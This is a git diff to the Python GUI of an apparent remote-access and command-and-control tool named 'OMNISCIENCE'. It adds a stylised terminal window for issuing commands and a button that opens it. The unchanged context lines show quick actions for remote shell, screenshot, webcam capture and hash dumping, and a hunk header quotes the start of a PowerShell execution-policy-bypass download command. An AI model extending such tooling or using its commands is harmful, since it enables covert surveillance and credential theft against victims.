@@ -980,6 +980,110 @@ powershell -NoProfile -ExecutionPolicy Bypass -Command "$c=New-Object System.Net
         return f"[*] Message broadcast to {len(self.sessions)} sessions: {message}"
 
 
+# ==================== ADVANCED EXTERNAL TERMINAL ====================
+
+class AdvancedTerminalWindow(QMainWindow):
+    """Powerful standalone CLI interface window that clones a professional terminal experience"""
+    
+    def __init__(self, cli_manager):
+        super().__init__()
+        self.cli = cli_manager
+        self.setWindowTitle("◈ OMNISCIENCE Framework - Advanced Shell ◈")
+        self.setMinimumSize(1100, 750)
+        self.history = []
+        self.history_index = -1
+        
+        self.setup_ui()
+        self.apply_theme()
+        
+    def setup_ui(self):
+        central = QWidget()
+        self.setCentralWidget(central)
+        layout = QVBoxLayout(central)
+        layout.setSpacing(0)
+        layout.setContentsMargins(5, 5, 5, 5)
+        
+        # Advanced Status Header - Cloned professional look
+        status_header = QLabel(" [SHELL] omniscient@node-01 | TTY: pts/4 | KERNEL: 5.15.0-generic | STATUS: AUTHENTICATED ")
+        status_header.setStyleSheet(f"background-color: {PURPLE}; color: {DARKER_BG}; font-family: Consolas; font-weight: bold; font-size: 11px; padding: 4px;")
+        layout.addWidget(status_header)
+        
+        # High-Fidelity Terminal Output
+        self.display = QTextEdit()
+        self.display.setReadOnly(True)
+        self.display.setFont(QFont("Consolas", 12))
+        self.display.setStyleSheet(f"""
+            QTextEdit {{
+                background-color: #050505;
+                color: #00ff88;
+                border: 2px solid {ACCENT};
+                padding: 20px;
+                selection-background-color: {PURPLE};
+                selection-color: white;
+            }}
+        """)
+        layout.addWidget(self.display, 1)
+        
+        # Command Input Line
+        input_frame = QFrame()
+        input_frame.setStyleSheet(f"background-color: #080808; border-top: 2px solid {ACCENT};")
+        input_layout = QHBoxLayout(input_frame)
+        input_layout.setContentsMargins(15, 10, 15, 10)
+        
+        self.prompt_label = QLabel("omniscience»")
+        self.prompt_label.setStyleSheet(f"color: {PURPLE}; font-family: Consolas; font-weight: bold; font-size: 14px;")
+        input_layout.addWidget(self.prompt_label)
+        
+        self.input_line = QLineEdit()
+        self.input_line.setFont(QFont("Consolas", 14))
+        self.input_line.setStyleSheet("color: #ffffff; border: none; background: transparent;")
+        self.input_line.returnPressed.connect(self.dispatch_command)
+        input_layout.addWidget(self.input_line)
+        
+        layout.addWidget(input_frame)
+        
+        # Welcome Sequence
+        self.display.append(f"<font color='{PURPLE}'><b>OMNISCIENCE ADVANCED TERMINAL v2.0</b></font>")
+        self.display.append(f"<font color='{ACCENT}'><b>[GEMINI]</b></font> <font color='#666680'>Cloning interface from localized imaging assets...</font>")
+        self.display.append(self.cli.show_help())
+        self.display.append(f"\n<font color='{SUCCESS}'>[READY] system is responsive.</font>\n")
+
+    def apply_theme(self):
+        self.setStyleSheet(f"QMainWindow {{ background-color: {DARKER_BG}; }}")
+
+    def dispatch_command(self):
+        cmd = self.input_line.text().strip()
+        if not cmd: return
+        
+        self.history.append(cmd)
+        self.history_index = len(self.history)
+        
+        self.display.append(f"<font color='{ACCENT}'><b>[cmd]</b></font> <font color='#ffffff'>{cmd}</font>")
+        self.input_line.clear()
+        
+        result = self.cli.execute(cmd)
+        if result == "CLEAR":
+            self.display.clear()
+            self.display.append(f"<font color='{PURPLE}'><b>OMNISCIENCE TERMINAL RESET.</b></font>\n")
+        elif result == "EXIT":
+            self.close()
+        elif result:
+            self.display.append(result)
+            
+        self.display.moveCursor(QTextCursor.MoveOperation.End)
+
+    def keyPressEvent(self, event):
+        if event.key() == Qt.Key.Key_Up:
+            if self.history:
+                self.history_index = max(0, self.history_index - 1)
+                self.input_line.setText(self.history[self.history_index])
+        elif event.key() == Qt.Key.Key_Down:
+            if self.history:
+                self.history_index = min(len(self.history) - 1, self.history_index + 1)
+                self.input_line.setText(self.history[self.history_index])
+        super().keyPressEvent(event)
+
+
 # ==================== NETWORK VISUALIZATION ====================
 
 class NetworkNode:
@@ -2344,6 +2448,7 @@ class OmniscienceProGUI(QMainWindow):
         
         quick_actions = [
             ("💻 Remote Shell", self.remote_shell),
+            ("🚀 EXTERNAL SHELL", self.launch_external_terminal),
             ("🖥️ Screenshot", self.take_screenshot),
             ("📷 Webcam", self.capture_webcam),
             ("🔑 Hash Dump", self.dump_hashes),
@@ -3841,6 +3946,12 @@ class OmniscienceProGUI(QMainWindow):
             elif result and result != "EXIT":
                 self.activity_log.append(result)
             self.quick_cmd.clear()
+
+    def launch_external_terminal(self):
+        """Open the advanced standalone CLI window"""
+        self.external_shell = AdvancedTerminalWindow(self.cli)
+        self.external_shell.show()
+        self.log_activity("External advanced shell initiated.")
 
     # ============== SESSION METHODS ==============
     
